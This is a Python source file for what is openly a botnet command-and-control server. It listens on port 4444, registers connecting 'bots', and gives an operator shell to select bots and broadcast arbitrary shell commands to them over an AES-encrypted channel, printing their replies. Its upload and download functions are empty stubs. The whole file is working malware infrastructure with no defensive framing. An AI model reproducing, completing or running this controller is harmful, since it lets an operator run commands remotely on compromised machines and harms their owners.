import socket
import threading
import sys
from UI.indicators import print_prompt, print_warning, print_success, print_info
from crypto_utils.AES_Cipher import encrypt, decrypt

bots = []
selected_bots = []

def handle_bot(conn, addr, bot_id):
    print_success(f"Bot {bot_id} connected from {addr}")
    bots.append((bot_id, conn, addr, f"Bot_{bot_id}"))
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
    except:
        pass
    print_warning(f"Bot {bot_id} disconnected")
    bots[:] = [b for b in bots if b[0] != bot_id]
    conn.close()

def broadcast_command(command):
    if not selected_bots:
        print_warning("No bots selected. Use /select or /all.")
        return
    for bot_id in selected_bots:
        for bot in bots:
            if bot[0] == bot_id:
                try:
                    bot[1].send(encrypt(command.encode()))
                    response = decrypt(bot[1].recv(4096)).decode()
                    print_info(f"[{bot[3]}] {response}")
                except Exception as e:
                    print_warning(f"Failed to send to {bot[3]}: {e}")

def send_file_to_bot(bot_id, local_path, remote_path):
    pass

def request_file_from_bot(bot_id, remote_path, local_path):
    pass

def handle_program_command(cmd):
    global selected_bots
    parts = cmd.split()
    if not parts:
        return

    match parts[0]:
        case "/help":
            print_info("""
/help             - Show this help message
/list             - List all connected bots
/select <ids>     - Select specific bots by ID (e.g. :select 1 2)
/all              - Select all connected bots
/deselect         - Deselect all bots
/name <id> <name> - Rename a bot (e.g. :name 2 Alpha)
/upload <id> <local> <remote> - Upload file to bot
/download <id> <remote> <local> - Download file from bot
/exit             - Exit the control shell
""")
        case "/list":
            if not bots:
                print_warning("No bots connected.")
            else:
                for bot_id, _, addr, name in bots:
                    selected = "*" if bot_id in selected_bots else " "
                    print_info(f"[{selected}] ID: {bot_id} | Name: {name} | Addr: {addr}")
        case "/select":
            if len(parts) < 2:
                print_warning("Usage: /select <id1> <id2> ...")
                return
            try:
                ids = list(map(int, parts[1:]))
                selected_bots = [bot_id for bot_id, *_ in bots if bot_id in ids]
                print_success(f"Selected bots: {selected_bots}")
            except ValueError:
                print_warning("Invalid IDs.")
        case "/all":
            selected_bots = [bot_id for bot_id, *_ in bots]
            print_success("All bots selected.")
        case "/deselect":
            selected_bots = []
            print_success("Deselected all bots.")
        case "/name":
            if len(parts) < 3:
                print_warning("Usage: /name <id> <new_name>")
                return
            try:
                target_id = int(parts[1])
                new_name = " ".join(parts[2:])
                for i in range(len(bots)):
                    if bots[i][0] == target_id:
                        bots[i] = (bots[i][0], bots[i][1], bots[i][2], new_name)
                        print_success(f"Bot {target_id} renamed to '{new_name}'")
                        return
                print_warning(f"No bot with ID {target_id}")
            except ValueError:
                print_warning("Invalid bot ID.")
        case "/upload":
            if len(parts) != 4:
                print_warning("Usage: /upload <id> <local_path> <remote_path>")
                return
            send_file_to_bot(int(parts[1]), parts[2], parts[3])
        case "/download":
            if len(parts) != 4:
                print_warning("Usage: /download <id> <remote_path> <local_path>")
                return
            request_file_from_bot(int(parts[1]), parts[2], parts[3])
        case "/exit":
            raise KeyboardInterrupt
        case _:
            print_warning("Unknown command. Use /help.")

def command_shell():
    print_info("Entering control shell. Use /help for commands.")
    while True:
        try:
            user_input = input(print_prompt(">> ")).strip()
            if not user_input:
                continue
            if user_input.startswith("/"):
                handle_program_command(user_input)
            else:
                broadcast_command(user_input)
        except KeyboardInterrupt:
            print_warning("Exiting control shell.")
            break

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
    except OSError as e:
        print_warning(f"Failed to bind to {host}:{port} - {e}")
        sys.exit(1)

    server.listen(5)
    print_success(f"Server listening on {host}:{port}")

    bot_counter = 1
    threading.Thread(target=command_shell, daemon=True).start()

    try:
        while True:
            conn, addr = server.accept()
            bot_id = bot_counter
            bot_counter += 1
            thread = threading.Thread(target=handle_bot, args=(conn, addr, bot_id), daemon=True)
            thread.start()
    except KeyboardInterrupt:
        print_warning("Server shutting down.")
    finally:
        server.close()
        sys.exit(0)

if __name__ == "__main__":
    start_server()
